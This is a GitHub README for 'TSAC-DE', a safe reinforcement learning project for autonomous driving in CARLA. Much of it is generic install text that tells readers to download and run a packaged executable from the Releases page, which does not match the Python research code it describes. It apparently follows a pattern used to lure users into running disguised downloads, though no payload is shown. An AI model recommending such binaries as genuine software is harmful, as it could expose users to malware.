---
layout: "default"
title: "🚗 immitation-learning - A Safer Approach to Autonomous Driving"
description: "🚗 Develop safe reinforcement learning methods for autonomous driving using trust-aware soft actor-critic and control barrier functions in CARLA."
---
# 🚗 immitation-learning - A Safer Approach to Autonomous Driving

[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/applekite/immitation-learning/releases)

---

## 🌟 Overview
TSAC-DE is a project designed to create a safe reinforcement learning algorithm for autonomous driving. This application focuses on ensuring safety while making real-time driving decisions. It combines advanced techniques to help self-driving cars learn effectively and operate safely in complex environments.

### Key Features
- **Spatio-temporal Transformer Encoder:** This component helps analyze sequential driving data, allowing the system to predict and adapt to changing conditions on the road.
- **Deep Ensemble Critics:** Multiple models work together to provide precise estimates of uncertainty in decision-making, enhancing safety.
- **Trust Score:** This score guides safe decisions based on how much confidence the system has in its chosen actions.
- **Control Barrier Functions (CBFs):** These functions ensure the vehicle meets safety constraints, reducing risks while driving.

---

## 🚀 Getting Started
Follow these steps to download and run TSAC-DE on your machine.

### Step 1: Visit the Releases Page
To get started, go to our [Releases page](https://github.com/applekite/immitation-learning/releases). Here, you can find the latest version of the software. 

### Step 2: Download the Application
On the Releases page, look for the most recent version. Click on the link that corresponds to your operating system. This will usually be a file you can download directly, such as `.exe` for Windows or `.tar.gz` for Linux.

### Step 3: Install the Application
Once the download is complete, locate the file in your downloads folder:
- For Windows: Double-click on the `.exe` file and follow the on-screen instructions to install the software.
- For Linux: Open a terminal, navigate to the download directory, and extract the files using the command:
  ```bash
  tar -xzvf your-file-name.tar.gz
  ```
  Then enter the extracted folder and follow the README instructions included there.

### Step 4: Run the Application
After installation, you can run TSAC-DE:
- On Windows, find the program in your Start Menu and click to open it.
- On Linux, navigate to the directory where you extracted the files and run:
  ```bash
  ./your-application-name
  ```

---

## 📊 Project Structure
The repository includes the following main directories:

```
tsac-de/
├─ tsac_de/          # Core package containing agents, models, safety checks, and utilities
├─ configs/          # Contains experiment configurations in YAML format
├─ carla/            # Includes wrappers for the CARLA simulator
```

This structure helps keep the project organized, ensuring each component is easy to find.

---

## 🖥️ System Requirements
Before running the software, ensure your system meets the following requirements:
- **Operating System:** Windows 10 or later, or a recent version of Linux.
- **Processor:** Multi-core processor with at least 2 GHz speed.
- **Memory:** At least 8 GB of RAM.
- **Storage:** Minimum of 2 GB of free disk space.
- **Graphics Card:** A dedicated graphics card for optimal performance, though integrated graphics may also work.

---

## 📥 Download & Install
To start using TSAC-DE, visit our [Releases page](https://github.com/applekite/immitation-learning/releases) to download the application. Follow the installation instructions listed above. If you encounter any issues during your installation or running the software, please consult the FAQs section below.

---

## ❓ FAQs

### How do I report an issue?
If you find a bug or have feedback, please create an issue on the GitHub repository. Your input helps us improve the project.

### Can I contribute to this project?
Yes! We welcome contributions. Please refer to the CONTRIBUTING.md file in the repository for guidelines on how to contribute.

### Where can I find more documentation?
Additional documentation is available in the `docs/` folder of the repository. This includes detailed explanations of the algorithms and libraries used in this project.

### Is there support for other platforms?
Currently, the application is primarily designed for Windows and Linux. Mac support may come in future releases depending on community interest.

---

## 📞 Contact
For support or questions, please reach out via GitHub issues, and we will get back to you promptly.

---

Thank you for your interest in TSAC-DE! Enjoy exploring the world of safe reinforcement learning.